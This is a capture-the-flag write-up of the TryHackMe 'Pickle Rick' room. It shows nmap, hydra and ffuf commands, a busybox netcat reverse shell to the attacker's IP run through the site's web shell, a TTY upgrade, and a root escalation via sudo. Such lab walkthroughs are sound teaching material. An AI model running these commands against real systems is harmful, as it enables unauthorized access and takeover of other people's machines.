# Pickle Rick
Pickle Rick is a Rick and Morty themed room on TryHackMe.com. This writeup will show exactly the thought processes I went through in obtaining all three flags.

---

# Init
Let's make things simple by adding the IP address to ```/etc/hosts``` as ```picklerick.thm```

---

# Recon 
Let's get an nmap scan started up
    > ```nmap -Pn -sS -sCV -p- -O -v picklerick.thm```

Looks like there's only ssh and an apache web server running on this machine. Let's see what we have
    > ```curl -v picklerick.thm```

We're getting some response data. Looks like Rick is locked out of his computer and wants us to log in somehow. In the source code we have this:
    
    <!--

        Note to self, remember username!

        Username: R1ckRul3s

    -->

This could probably be useful. Let's see if we can do an ssh brute force in the background while we try out some other things:
    
    hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt ssh://picklerick.thm -v -t 4

Uh-oh. 
   > ```R1ckRul3s@picklerick.thm: Permission denied (publickey).```

---

# Enumeration

Since port 22 is eliminated, let's see what we can find by fuzzing for directories
    
    ffuf -u picklerick.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.sh,.js,.css,.bak --recursion -v

While that runs, let's check out /robots.txt to see if we can find anything useful.
    > ```curl http://picklerick.thm/robots.txt```
We have a hit, but what's this mean?
    > ```Wubbalubbadubdub```

Well, well, well!
    
    login.php               [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 95ms]

Let's travel there in our browser and see what's going on...
Looks like some type of login page. Before we try brute forcing this, let's see what happens when we try ```R1ckRul3s:Wubbalubbadubdub```

Success!

---

# I'm in

Now that we have access to the inner parts of the site, let's see what we have around here.
The default redirect page seems to be a php web shell. I guess they have half the work done for us. Let's check out what we can do with this.

Try the ```ls``` command does in fact return a directory listing. So we can execute commands.

Let's try to get a better connection. ```which busybox``` returns ```/bin/busybox```, so let's get a reverse shell established:

1) From our terminal, let's run ```nc -lvnp 4444```
2) On the web shell, ```busybox nc <OUR IP> 4444 -e bash```
3) We should see this:
        
        listening on [any] 4444 ...
        connect to [10.6.32.97] from (UNKNOWN) [10.10.14.250] 34136
        
With a connection established, let's try to make this a better experience:

1) ```which python3``` returns ```/usr/bin/python3```, showing that we have acccess to python3
2) ```python3 -c 'import pty;pty.spawn("/bin/bash")'``` should show the following: ```www-data@ip-10-10-14-250:/var/www/html$``` (note: you may have to hit return before this shows)
3) ```export TERM=xterm```
4) ```Ctrl+Z```, ```stty raw -echo;fg``` (note: you may have to hit return again to show the prompt)

Now we should have a reverse shell that shows more like ssh, with a bit more stable of a connection.

---

# Flags and privesc

## Flag 1
Being in the ```/var/www/http```, we should see a file called ```Sup3rS3cretPickl3Ingred.txt```. Let's run cat and see the contents
    
    cat Sup3rS3cretPickl3Ingred.txt

We've found the first flag!

## Flag 2 

Let's check out what other user info there is on the system.
    
    ls -la /home
Looks like we have two folders, ```rick``` and ```ubuntu```, with read permissions on both. Let's check them out with ```ls -laR /home/```

There's an interesting file in the ```rick``` directory called ```second ingredients```
   
    cat  /home/rick/second\ ingredients

We have flag 2!

## Flag 3
Let's see if we can escalate our priveleges to root to really dig around in the system
   
    sudo -l

    User www-data may run the following commands on ip-10-10-14-250:
    (ALL) NOPASSWD: ALL


Well let's just go for the gusto then.
  
    sudo su -

Success!

Now that we're root, let's see what's in root's home directory.
    
    ls -la

We have an interesting file here called 3rd.txt
    
    cat 3rd.txt

And that's the final flag!

---

# Conclusion

This was a super easy machine, but it was fun and refreshing. The security on this system was horrible, but it makes it great for beginners or people trying to have fun accessing a system. Overall, I really enjoyed this machine. It was interesting how you really can't perform any type of brute-force attacks on this machine whatsoever. Instead, you had to find another way in using some key tools, though few were necessary. The main takeaway from this machine is really just a reinforcement of key commands for directory fuzzing and establishing a remote shell. 
